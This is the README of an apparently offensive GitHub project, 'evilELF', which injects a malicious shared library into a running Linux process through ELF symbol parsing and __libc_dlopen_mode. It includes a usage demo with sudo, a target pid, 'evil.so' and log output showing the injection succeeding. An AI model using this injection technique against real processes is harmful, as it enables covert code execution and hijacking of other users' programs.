# evilELF
Malicious use of ELF such as .so inject, func hook and so on.

## [InejctRuntimeELF](https://github.com/jmpews/evilELF/tree/master/InjectRuntimeELF)

具体参考 [linux进程动态so注入](https://github.com/jmpews/dev2pwn/blob/master/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5.md)
实现恶意 `so` 注入, 采用直接解析 `ELF` 文件的方式, 更加具有通用性, 并以 `.gnu.hash` 进行符号查找, 适用于目前的 `ELF` 结构.

代码规范, 参考 `glibc-2.19`, 用 `ElfW` 宏进行 `32` 和 `64` 字长兼容.

#### Demo & Usage

```
➜  InjectRuntimeELF git:(master) ✗ sudo ./inject 3631 /evilELF/InjectRuntimeELF/example/evil.so
--------------------------------------------------------------
InjectRuntimeELF - (1.0.0) - by jmpews@gmail.com
--------------------------------------------------------------
[*] attached to pid 3631.
[*] dump runtime infomation
[*] dumping header...
[*] start symbol search '__libc_dlopen_mode'...
[*] start search libaray: /lib/i386-linux-gnu/libc.so.6
[*] start bucket search...
[*] found '__libc_dlopen_mode' at 0xb7693ae0
[+] entry point: 0x8048380
[+] stopped 3631 at eip:0xb7729428, esp:0xbf93cffc
[+] inject code done 3631 at eip:0x8048396
[*] start symbol search 'evilfunc'...
[*] start search libaray: /lib/i386-linux-gnu/libc.so.6
[*] start search libaray: /lib/ld-linux.so.2
[*] search in ld, no link_map.
[*] start search libaray: /evilELF/InjectRuntimeELF/example/evil.so
[*] start bucket search...
[*] found 'evilfunc' at 0xb772353b
[*] lib injection done!
```
